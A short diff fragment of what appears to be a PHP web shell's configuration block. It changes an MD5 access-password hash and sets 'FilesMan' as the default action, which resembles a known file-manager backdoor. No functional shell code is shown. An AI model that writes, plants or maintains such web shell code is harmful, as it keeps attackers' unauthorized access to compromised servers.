@@ -14,7 +14,7 @@
  
 /* Configuration */
 /* Password using md5 hashes */
-$password = "e5f45a0a383440b5dcf789715c5c1ddd"; 
+$password = "cc322490646abca21990129bc1cb5b8d"; 
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
